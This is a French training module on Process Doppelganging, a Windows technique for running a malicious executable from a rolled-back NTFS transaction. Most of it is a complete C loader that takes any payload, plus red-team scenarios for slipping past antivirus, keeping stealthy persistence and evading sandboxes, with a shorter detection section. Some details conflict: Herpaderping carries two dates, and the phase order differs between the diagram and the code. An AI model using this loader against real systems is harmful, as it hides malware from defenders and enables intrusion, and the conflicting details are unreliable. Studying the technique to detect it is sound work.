# Module W26 : Process Doppelganging

## Objectifs

À la fin de ce module, vous serez capable de :
- Comprendre le mécanisme de NTFS Transactional (TxF)
- Implémenter une technique Process Doppelganging complète
- Créer un processus sans fichier sur disque persistant
- Contourner les solutions de sécurité qui scannent les fichiers

## 1. Introduction au Process Doppelganging

### 1.1 Qu'est-ce que le Process Doppelganging ?

**Analogie** : Imaginez que vous voulez faire entrer une personne dans un bâtiment sécurisé. Au lieu de créer un faux badge, vous utilisez une "transaction" : vous créez temporairement un badge légitime, la personne entre, puis vous annulez la transaction. Le badge disparaît, mais la personne est déjà à l'intérieur.

**Définition** : Process Doppelganging est une technique d'injection qui exploite les transactions NTFS (TxF) pour créer un processus à partir d'un fichier qui n'existe jamais réellement sur le disque.

**Avantages** :
- Pas de fichier malveillant persistant sur disque
- Contourne les scans antivirus basés sur fichier
- Le processus apparaît légitime dans les outils de monitoring
- Fonctionne même avec des outils de sandboxing

### 1.2 Historique et contexte

**2017** : Technique présentée par Tal Liberman et Eugene Kogan (enSilo) à Black Hat Europe
- Fonctionne sur Windows Vista à Windows 10 (avant 1803)
- Microsoft a partiellement mitigé via la dépréciation de TxF
- Variantes encore exploitables sur systèmes non patchés

**Évolution des techniques d'injection** :
```
2000s: DLL Injection classique
  ↓
2010s: Process Hollowing
  ↓
2016: Process Herpaderping
  ↓
2017: Process Doppelganging ←─ Vous êtes ici
  ↓
2020+: Process Ghosting, Phantom DLL Hollowing
```

## 2. Concepts fondamentaux : NTFS Transactions (TxF)

### 2.1 Qu'est-ce qu'une transaction NTFS ?

**Principe ACID** (comme les bases de données) :
- **Atomicité** : Tout ou rien
- **Cohérence** : État valide avant/après
- **Isolation** : Invisible aux autres processus
- **Durabilité** : Persistance après commit

**Opérations TxF** :
1. **CreateTransaction()** : Crée une transaction
2. **CreateFileTransacted()** : Crée un fichier dans la transaction
3. **WriteFile()** : Écrit des données (dans la transaction)
4. **RollbackTransaction()** : Annule la transaction (le fichier disparaît)
5. **CommitTransaction()** : Valide la transaction (le fichier persiste)

### 2.2 Schéma du cycle de vie TxF

```
État du système de fichiers
═══════════════════════════

Temps 0: Disque vide
┌────────────────────┐
│  C:\Temp\          │
│  (vide)            │
└────────────────────┘

Temps 1: CreateTransaction()
┌────────────────────┐
│  Transaction ouverte│
│  TxID: 0x12345     │
└────────────────────┘

Temps 2: CreateFileTransacted("evil.exe", TxID)
┌────────────────────────────────┐
│  C:\Temp\                      │
│    evil.exe (TRANSACTION)      │◄── Visible UNIQUEMENT dans la transaction
│    [PE malveillant]            │
└────────────────────────────────┘
         │
         ├─ Autres processus : Ne voient PAS le fichier
         └─ Notre processus (TxID) : Voit le fichier

Temps 3: NtCreateProcessEx(fichier dans transaction)
┌────────────────────────────────┐
│  Processus créé depuis evil.exe│
│  Process ID: 1234              │
│  Image: evil.exe (en mémoire)  │
└────────────────────────────────┘

Temps 4: RollbackTransaction()
┌────────────────────┐
│  C:\Temp\          │
│  (vide)            │◄── Le fichier a DISPARU
└────────────────────┘

Mais le processus existe toujours !
┌────────────────────────────────┐
│  PID 1234 toujours actif       │
│  Code malveillant en exécution │
│  Aucun fichier sur disque      │
└────────────────────────────────┘
```

### 2.3 Pourquoi c'est efficace contre les AV/EDR ?

**Scans antivirus traditionnels** :
```
AV Scanner
    │
    ├─► 1. Scan fichier sur disque ────► Fichier n'existe pas (rollback)
    │
    ├─► 2. Scan création processus ────► Processus légitime (image clean)
    │
    └─► 3. Scan mémoire ────────────────► Code déjà décrypté/exécuté
```

**Timing critique** :
- L'AV scanne le fichier AVANT le commit
- Le processus est créé PENDANT la transaction
- Le rollback efface le fichier APRÈS la création du processus

## 3. Étapes du Process Doppelganging

### 3.1 Vue d'ensemble du flux

```
┌─────────────────────────────────────────────────────────┐
│                 PROCESS DOPPELGANGING                   │
└─────────────────────────────────────────────────────────┘
         │
         ├─► PHASE 1: TRANSACT
         │   ├─ CreateTransaction()
         │   ├─ CreateFileTransacted("legitime.exe")
         │   └─ WriteFile(PE malveillant)
         │
         ├─► PHASE 2: LOAD
         │   ├─ NtCreateSection(fichier transacted)
         │   └─ Section mapping du PE
         │
         ├─► PHASE 3: ROLLBACK
         │   ├─ RollbackTransaction()
         │   └─ Le fichier disparaît
         │
         ├─► PHASE 4: ANIMATE
         │   ├─ NtCreateProcessEx(section)
         │   ├─ Création du processus
         │   └─ NtCreateThreadEx(entry point)
         │
         └─► RÉSULTAT
             └─ Processus actif sans fichier source
```

### 3.2 Détails de chaque phase

#### Phase 1 : Transact (Création du fichier transactionnel)

```c
// Étape 1.1 : Créer une transaction
HANDLE hTransaction = CreateTransaction(
    NULL,                       // SecurityAttributes
    NULL,                       // TransactionGUID (auto)
    0,                          // CreateOptions
    0,                          // IsolationLevel
    0,                          // IsolationFlags
    0,                          // Timeout
    NULL                        // Description
);

// Étape 1.2 : Créer un fichier dans la transaction
HANDLE hTransactedFile = CreateFileTransacted(
    L"C:\\Windows\\System32\\calc.exe",  // Nom légitime
    GENERIC_WRITE | GENERIC_READ,
    0,
    NULL,
    CREATE_ALWAYS,
    FILE_ATTRIBUTE_NORMAL,
    NULL,
    hTransaction,               // Transaction handle
    NULL,
    NULL
);

// Étape 1.3 : Écrire le PE malveillant dans le fichier
DWORD bytesWritten;
WriteFile(
    hTransactedFile,
    maliciousPE,                // Buffer PE malveillant
    maliciousPESize,
    &bytesWritten,
    NULL
);
```

#### Phase 2 : Load (Création de la section)

```c
// Étape 2.1 : Créer une section depuis le fichier transacted
HANDLE hSection = NULL;
NtCreateSection(
    &hSection,
    SECTION_ALL_ACCESS,
    NULL,
    NULL,                       // MaximumSize (auto)
    PAGE_READONLY,
    SEC_IMAGE,                  // Section d'image PE
    hTransactedFile             // Fichier transactionnel
);

// La section contient maintenant le PE malveillant en mémoire
// mais il est associé au fichier transactionnel
```

#### Phase 3 : Rollback (Suppression du fichier)

```c
// Étape 3.1 : Fermer le handle du fichier
CloseHandle(hTransactedFile);

// Étape 3.2 : Rollback de la transaction
RollbackTransaction(hTransaction);

// Le fichier sur disque est maintenant supprimé
// MAIS la section en mémoire existe toujours !
```

#### Phase 4 : Animate (Création du processus)

```c
// Étape 4.1 : Créer un processus depuis la section
HANDLE hProcess = NULL;
NtCreateProcessEx(
    &hProcess,
    PROCESS_ALL_ACCESS,
    NULL,
    GetCurrentProcess(),        // Parent process
    0,                          // Flags
    hSection,                   // Section handle
    NULL,                       // DebugPort
    NULL,                       // Token
    0                           // Reserved
);

// Étape 4.2 : Créer les structures du processus
// (PEB, paramètres, etc.)
CreateProcessParameters(...);

// Étape 4.3 : Créer le thread principal
HANDLE hThread = NULL;
NtCreateThreadEx(
    &hThread,
    THREAD_ALL_ACCESS,
    NULL,
    hProcess,
    entryPoint,                 // Point d'entrée du PE
    NULL,
    0,
    0,
    0,
    0,
    NULL
);
```

## 4. Implémentation complète

### 4.1 Structures et déclarations

```c
#include <windows.h>
#include <winternl.h>
#include <stdio.h>

// Kernel Transaction Manager (KTM) APIs
typedef HANDLE (WINAPI *pCreateTransaction)(
    LPSECURITY_ATTRIBUTES lpTransactionAttributes,
    LPGUID UOW,
    DWORD CreateOptions,
    DWORD IsolationLevel,
    DWORD IsolationFlags,
    DWORD Timeout,
    LPWSTR Description
);

typedef BOOL (WINAPI *pRollbackTransaction)(HANDLE TransactionHandle);

typedef HANDLE (WINAPI *pCreateFileTransactedW)(
    LPCWSTR lpFileName,
    DWORD dwDesiredAccess,
    DWORD dwShareMode,
    LPSECURITY_ATTRIBUTES lpSecurityAttributes,
    DWORD dwCreationDisposition,
    DWORD dwFlagsAndAttributes,
    HANDLE hTemplateFile,
    HANDLE hTransaction,
    PUSHORT pusMiniVersion,
    PVOID lpExtendedParameter
);

// Native API declarations
typedef NTSTATUS (NTAPI *pNtCreateSection)(
    OUT PHANDLE SectionHandle,
    IN ACCESS_MASK DesiredAccess,
    IN POBJECT_ATTRIBUTES ObjectAttributes OPTIONAL,
    IN PLARGE_INTEGER MaximumSize OPTIONAL,
    IN ULONG SectionPageProtection,
    IN ULONG AllocationAttributes,
    IN HANDLE FileHandle OPTIONAL
);

typedef NTSTATUS (NTAPI *pNtCreateProcessEx)(
    OUT PHANDLE ProcessHandle,
    IN ACCESS_MASK DesiredAccess,
    IN POBJECT_ATTRIBUTES ObjectAttributes OPTIONAL,
    IN HANDLE ParentProcess,
    IN ULONG Flags,
    IN HANDLE SectionHandle OPTIONAL,
    IN HANDLE DebugPort OPTIONAL,
    IN HANDLE ExceptionPort OPTIONAL,
    IN ULONG JobMemberLevel
);

typedef NTSTATUS (NTAPI *pNtCreateThreadEx)(
    OUT PHANDLE ThreadHandle,
    IN ACCESS_MASK DesiredAccess,
    IN POBJECT_ATTRIBUTES ObjectAttributes OPTIONAL,
    IN HANDLE ProcessHandle,
    IN PVOID StartRoutine,
    IN PVOID Argument OPTIONAL,
    IN ULONG CreateFlags,
    IN SIZE_T ZeroBits,
    IN SIZE_T StackSize,
    IN SIZE_T MaximumStackSize,
    IN PVOID AttributeList OPTIONAL
);

typedef NTSTATUS (NTAPI *pNtQueryInformationProcess)(
    IN HANDLE ProcessHandle,
    IN PROCESSINFOCLASS ProcessInformationClass,
    OUT PVOID ProcessInformation,
    IN ULONG ProcessInformationLength,
    OUT PULONG ReturnLength OPTIONAL
);

typedef NTSTATUS (NTAPI *pNtWriteVirtualMemory)(
    IN HANDLE ProcessHandle,
    IN PVOID BaseAddress,
    IN PVOID Buffer,
    IN SIZE_T NumberOfBytesToWrite,
    OUT PSIZE_T NumberOfBytesWritten OPTIONAL
);

typedef NTSTATUS (NTAPI *pNtReadVirtualMemory)(
    IN HANDLE ProcessHandle,
    IN PVOID BaseAddress,
    OUT PVOID Buffer,
    IN SIZE_T NumberOfBytesToRead,
    OUT PSIZE_T NumberOfBytesRead OPTIONAL
);

#define NT_SUCCESS(Status) (((NTSTATUS)(Status)) >= 0)
```

### 4.2 Fonction principale de Doppelganging

```c
BOOL ProcessDoppelganging(LPCWSTR targetPath, LPVOID payloadPE, SIZE_T payloadSize) {
    printf("[*] Démarrage Process Doppelganging\n");
    printf("[*] Fichier cible: %ls\n", targetPath);
    printf("[*] Taille payload: %zu octets\n", payloadSize);

    // 1. Résoudre les APIs nécessaires
    HMODULE hKtmw32 = LoadLibraryW(L"ktmw32.dll");
    if (!hKtmw32) {
        printf("[-] Erreur LoadLibrary(ktmw32.dll): %d\n", GetLastError());
        return FALSE;
    }

    pCreateTransaction CreateTransaction = (pCreateTransaction)
        GetProcAddress(hKtmw32, "CreateTransaction");
    pRollbackTransaction RollbackTransaction = (pRollbackTransaction)
        GetProcAddress(hKtmw32, "RollbackTransaction");
    pCreateFileTransactedW CreateFileTransactedW = (pCreateFileTransactedW)
        GetProcAddress(GetModuleHandleW(L"kernel32.dll"), "CreateFileTransactedW");

    HMODULE hNtdll = GetModuleHandleW(L"ntdll.dll");
    pNtCreateSection NtCreateSection = (pNtCreateSection)
        GetProcAddress(hNtdll, "NtCreateSection");
    pNtCreateProcessEx NtCreateProcessEx = (pNtCreateProcessEx)
        GetProcAddress(hNtdll, "NtCreateProcessEx");
    pNtCreateThreadEx NtCreateThreadEx = (pNtCreateThreadEx)
        GetProcAddress(hNtdll, "NtCreateThreadEx");
    pNtQueryInformationProcess NtQueryInformationProcess = (pNtQueryInformationProcess)
        GetProcAddress(hNtdll, "NtQueryInformationProcess");
    pNtWriteVirtualMemory NtWriteVirtualMemory = (pNtWriteVirtualMemory)
        GetProcAddress(hNtdll, "NtWriteVirtualMemory");
    pNtReadVirtualMemory NtReadVirtualMemory = (pNtReadVirtualMemory)
        GetProcAddress(hNtdll, "NtReadVirtualMemory");

    if (!CreateTransaction || !CreateFileTransactedW || !NtCreateSection ||
        !NtCreateProcessEx || !NtCreateThreadEx) {
        printf("[-] Erreur résolution des APIs\n");
        return FALSE;
    }

    printf("[+] APIs résolues avec succès\n");

    // ============================================================
    // PHASE 1: TRANSACT - Créer le fichier transactionnel
    // ============================================================

    printf("\n[*] PHASE 1: TRANSACT\n");

    HANDLE hTransaction = CreateTransaction(NULL, NULL, 0, 0, 0, 0, NULL);
    if (hTransaction == INVALID_HANDLE_VALUE) {
        printf("[-] Erreur CreateTransaction: %d\n", GetLastError());
        return FALSE;
    }
    printf("[+] Transaction créée: 0x%p\n", hTransaction);

    HANDLE hTransactedFile = CreateFileTransactedW(
        targetPath,
        GENERIC_WRITE | GENERIC_READ,
        0,
        NULL,
        CREATE_ALWAYS,
        FILE_ATTRIBUTE_NORMAL,
        NULL,
        hTransaction,
        NULL,
        NULL
    );

    if (hTransactedFile == INVALID_HANDLE_VALUE) {
        printf("[-] Erreur CreateFileTransacted: %d\n", GetLastError());
        RollbackTransaction(hTransaction);
        CloseHandle(hTransaction);
        return FALSE;
    }
    printf("[+] Fichier transactionnel créé: 0x%p\n", hTransactedFile);

    // Écrire le PE malveillant dans le fichier transactionnel
    DWORD bytesWritten = 0;
    if (!WriteFile(hTransactedFile, payloadPE, (DWORD)payloadSize, &bytesWritten, NULL)) {
        printf("[-] Erreur WriteFile: %d\n", GetLastError());
        CloseHandle(hTransactedFile);
        RollbackTransaction(hTransaction);
        CloseHandle(hTransaction);
        return FALSE;
    }
    printf("[+] PE écrit: %d octets\n", bytesWritten);

    // ============================================================
    // PHASE 2: LOAD - Créer une section depuis le fichier
    // ============================================================

    printf("\n[*] PHASE 2: LOAD\n");

    HANDLE hSection = NULL;
    NTSTATUS status = NtCreateSection(
        &hSection,
        SECTION_ALL_ACCESS,
        NULL,
        NULL,
        PAGE_READONLY,
        SEC_IMAGE,
        hTransactedFile
    );

    if (!NT_SUCCESS(status)) {
        printf("[-] Erreur NtCreateSection: 0x%08X\n", status);
        CloseHandle(hTransactedFile);
        RollbackTransaction(hTransaction);
        CloseHandle(hTransaction);
        return FALSE;
    }
    printf("[+] Section créée: 0x%p\n", hSection);

    // ============================================================
    // PHASE 3: ROLLBACK - Supprimer le fichier
    // ============================================================

    printf("\n[*] PHASE 3: ROLLBACK\n");

    CloseHandle(hTransactedFile);

    if (!RollbackTransaction(hTransaction)) {
        printf("[-] Erreur RollbackTransaction: %d\n", GetLastError());
        CloseHandle(hSection);
        CloseHandle(hTransaction);
        return FALSE;
    }
    printf("[+] Transaction annulée - fichier supprimé\n");

    CloseHandle(hTransaction);

    // ============================================================
    // PHASE 4: ANIMATE - Créer et démarrer le processus
    // ============================================================

    printf("\n[*] PHASE 4: ANIMATE\n");

    // Créer le processus depuis la section
    HANDLE hProcess = NULL;
    status = NtCreateProcessEx(
        &hProcess,
        PROCESS_ALL_ACCESS,
        NULL,
        GetCurrentProcess(),
        0,
        hSection,
        NULL,
        NULL,
        0
    );

    if (!NT_SUCCESS(status)) {
        printf("[-] Erreur NtCreateProcessEx: 0x%08X\n", status);
        CloseHandle(hSection);
        return FALSE;
    }
    printf("[+] Processus créé: 0x%p\n", hProcess);

    // Récupérer les informations du processus
    PROCESS_BASIC_INFORMATION pbi = { 0 };
    ULONG returnLength = 0;
    status = NtQueryInformationProcess(
        hProcess,
        ProcessBasicInformation,
        &pbi,
        sizeof(pbi),
        &returnLength
    );

    if (!NT_SUCCESS(status)) {
        printf("[-] Erreur NtQueryInformationProcess: 0x%08X\n", status);
        TerminateProcess(hProcess, 1);
        CloseHandle(hProcess);
        CloseHandle(hSection);
        return FALSE;
    }

    printf("[+] PEB: 0x%p\n", pbi.PebBaseAddress);

    // Lire le PEB pour obtenir l'ImageBaseAddress
    PEB peb = { 0 };
    SIZE_T bytesRead = 0;
    status = NtReadVirtualMemory(
        hProcess,
        pbi.PebBaseAddress,
        &peb,
        sizeof(peb),
        &bytesRead
    );

    if (!NT_SUCCESS(status)) {
        printf("[-] Erreur NtReadVirtualMemory(PEB): 0x%08X\n", status);
        TerminateProcess(hProcess, 1);
        CloseHandle(hProcess);
        CloseHandle(hSection);
        return FALSE;
    }

    printf("[+] Image Base: 0x%p\n", peb.Reserved3[1]);

    // Lire les headers PE pour trouver l'entry point
    IMAGE_DOS_HEADER dosHeader = { 0 };
    status = NtReadVirtualMemory(
        hProcess,
        peb.Reserved3[1],
        &dosHeader,
        sizeof(dosHeader),
        &bytesRead
    );

    if (!NT_SUCCESS(status) || dosHeader.e_magic != IMAGE_DOS_SIGNATURE) {
        printf("[-] Erreur lecture DOS header\n");
        TerminateProcess(hProcess, 1);
        CloseHandle(hProcess);
        CloseHandle(hSection);
        return FALSE;
    }

    IMAGE_NT_HEADERS ntHeaders = { 0 };
    status = NtReadVirtualMemory(
        hProcess,
        (PBYTE)peb.Reserved3[1] + dosHeader.e_lfanew,
        &ntHeaders,
        sizeof(ntHeaders),
        &bytesRead
    );

    if (!NT_SUCCESS(status) || ntHeaders.Signature != IMAGE_NT_SIGNATURE) {
        printf("[-] Erreur lecture NT headers\n");
        TerminateProcess(hProcess, 1);
        CloseHandle(hProcess);
        CloseHandle(hSection);
        return FALSE;
    }

    // Calculer l'entry point
    PVOID entryPoint = (PBYTE)peb.Reserved3[1] + ntHeaders.OptionalHeader.AddressOfEntryPoint;
    printf("[+] Entry Point: 0x%p\n", entryPoint);

    // Créer le thread principal
    HANDLE hThread = NULL;
    status = NtCreateThreadEx(
        &hThread,
        THREAD_ALL_ACCESS,
        NULL,
        hProcess,
        entryPoint,
        NULL,
        0,
        0,
        0,
        0,
        NULL
    );

    if (!NT_SUCCESS(status)) {
        printf("[-] Erreur NtCreateThreadEx: 0x%08X\n", status);
        TerminateProcess(hProcess, 1);
        CloseHandle(hProcess);
        CloseHandle(hSection);
        return FALSE;
    }

    printf("[+] Thread créé: 0x%p\n", hThread);
    printf("[+] Process Doppelganging réussi !\n");
    printf("[+] PID: %d\n", (DWORD)pbi.UniqueProcessId);

    CloseHandle(hThread);
    CloseHandle(hProcess);
    CloseHandle(hSection);

    return TRUE;
}
```

### 4.3 Exemple d'utilisation

```c
int wmain(int argc, wchar_t* argv[]) {
    if (argc != 3) {
        wprintf(L"Usage: %s <fichier_target> <payload.exe>\n", argv[0]);
        wprintf(L"Exemple: %s C:\\Windows\\System32\\calc.exe payload.exe\n", argv[0]);
        return 1;
    }

    LPCWSTR targetPath = argv[1];
    LPCWSTR payloadPath = argv[2];

    // Charger le payload depuis le fichier
    HANDLE hPayloadFile = CreateFileW(
        payloadPath,
        GENERIC_READ,
        FILE_SHARE_READ,
        NULL,
        OPEN_EXISTING,
        FILE_ATTRIBUTE_NORMAL,
        NULL
    );

    if (hPayloadFile == INVALID_HANDLE_VALUE) {
        wprintf(L"[-] Erreur ouverture payload: %d\n", GetLastError());
        return 1;
    }

    DWORD payloadSize = GetFileSize(hPayloadFile, NULL);
    LPVOID payloadBuffer = malloc(payloadSize);

    if (!payloadBuffer) {
        wprintf(L"[-] Erreur allocation mémoire\n");
        CloseHandle(hPayloadFile);
        return 1;
    }

    DWORD bytesRead = 0;
    if (!ReadFile(hPayloadFile, payloadBuffer, payloadSize, &bytesRead, NULL)) {
        wprintf(L"[-] Erreur lecture payload: %d\n", GetLastError());
        free(payloadBuffer);
        CloseHandle(hPayloadFile);
        return 1;
    }

    CloseHandle(hPayloadFile);

    // Exécuter le Process Doppelganging
    if (!ProcessDoppelganging(targetPath, payloadBuffer, payloadSize)) {
        wprintf(L"[-] Process Doppelganging échoué\n");
        free(payloadBuffer);
        return 1;
    }

    free(payloadBuffer);
    wprintf(L"[+] Terminé avec succès\n");

    return 0;
}
```

## 5. Applications Offensives

### 5.1 Cas d'usage Red Team

**Scénario 1 : Bypass d'antivirus on-access**
- Cible : Système avec AV qui scanne tous les fichiers écrits
- Technique : Process Doppelganging avec rollback immédiat
- Résultat : L'AV ne voit jamais le payload complet
- OPSEC : Utiliser un nom de fichier légitime (calc.exe, notepad.exe)

**Scénario 2 : Persistance furtive**
- Cible : Environnement avec monitoring des créations de fichiers
- Technique : Combinaison avec scheduled tasks
- Résultat : Exécution sans artefact sur disque
- OPSEC : Cleanup automatique des logs de transactions

**Scénario 3 : Sandbox evasion**
- Cible : Sandbox qui analyse les fichiers écrits
- Technique : Doppelganging avec délai minimal
- Résultat : Le processus s'exécute avant l'analyse complète
- OPSEC : Choix de processus parent légitime

### 5.2 Détection et Contre-mesures

**Indicateurs de Compromission (IOC)** :

1. **Transactions NTFS suspectes** :
   - Transactions créées puis rollback immédiat
   - Création de fichiers système en transaction
   - Monitoring : ETW Event ID 1102 (KTM)

2. **Création de processus anormale** :
   - Processus créé via NtCreateProcessEx au lieu de CreateProcess
   - Section mappée d'un fichier qui n'existe plus
   - Monitoring : Sysmon Event ID 1 avec analyse de la chaîne de création

3. **Artefacts en mémoire** :
   - Sections IMAGE sans fichier backing
   - PEB avec chemin de fichier invalide/inexistant
   - Monitoring : Scans mémoire réguliers

**Techniques de détection** :

```c
// Pseudo-code de détection
BOOL DetectDoppelganging(HANDLE hProcess) {
    // 1. Vérifier si le fichier backing existe
    WCHAR imagePath[MAX_PATH];
    GetProcessImageFileName(hProcess, imagePath, MAX_PATH);

    if (!PathFileExists(imagePath)) {
        // Suspect : processus sans fichier source
        return TRUE;
    }

    // 2. Comparer hash mémoire vs disque
    BYTE memHash[32], diskHash[32];
    HashProcessMemory(hProcess, memHash);
    HashFile(imagePath, diskHash);

    if (memcmp(memHash, diskHash, 32) != 0) {
        // Suspect : divergence mémoire/disque
        return TRUE;
    }

    // 3. Vérifier les transactions actives
    if (HasActiveTransaction(hProcess)) {
        return TRUE;
    }

    return FALSE;
}
```

**Mitigations** :

1. **Microsoft** :
   - Windows 10 1803+ : TxF déprécié
   - Windows 11 : CreateFileTransacted retourne ERROR_NOT_SUPPORTED

2. **EDR/AV** :
   - Monitoring des appels NtCreateSection avec SEC_IMAGE
   - Analyse des transactions NTFS via ETW
   - Vérification de cohérence fichier/mémoire

3. **Hardening** :
   - Désactiver TxF si non utilisé (via GPO)
   - AppLocker/WDAC pour validation de code signé
   - Kernel callbacks pour création de processus

## 6. Variantes et Évolutions

### 6.1 Process Herpaderping (2020)

Similaire mais utilise un remplacement de fichier après création :
```
1. Créer fichier légitime
2. Ouvrir avec DELETE access
3. Créer section
4. Écraser le fichier avec contenu bénin
5. Créer processus
6. Le processus exécute le code malveillant, le fichier est bénin
```

### 6.2 Process Ghosting (2021)

Exploite les fichiers "delete-pending" :
```
1. Créer fichier
2. Marquer comme delete-pending (NtSetInformationFile)
3. Écrire PE malveillant
4. Créer section
5. Fermer le handle → fichier supprimé
6. Créer processus depuis la section
```

## 7. Checklist de maîtrise

- [ ] Je comprends le concept de transactions NTFS (TxF)
- [ ] Je peux expliquer les phases du Process Doppelganging
- [ ] Je sais utiliser CreateTransaction et CreateFileTransacted
- [ ] Je maîtrise NtCreateSection avec SEC_IMAGE
- [ ] Je comprends la différence entre rollback et commit
- [ ] Je peux créer un processus avec NtCreateProcessEx
- [ ] Je sais lire le PEB et trouver l'entry point
- [ ] Je connais les méthodes de détection de cette technique
- [ ] Je comprends pourquoi TxF a été déprécié

## Exercices

Voir [exercice.md](exercice.md) pour :
1. Implémenter un Process Doppelganging basique
2. Créer une variante avec cleanup automatique
3. Développer un détecteur de Doppelganging
4. Implémenter Process Ghosting comme alternative

---

**Navigation**
- [Module précédent : Process Hollowing](../03-Process-Hollowing/)
- [Module suivant : Module Stomping](../05-Module-Stomping/)
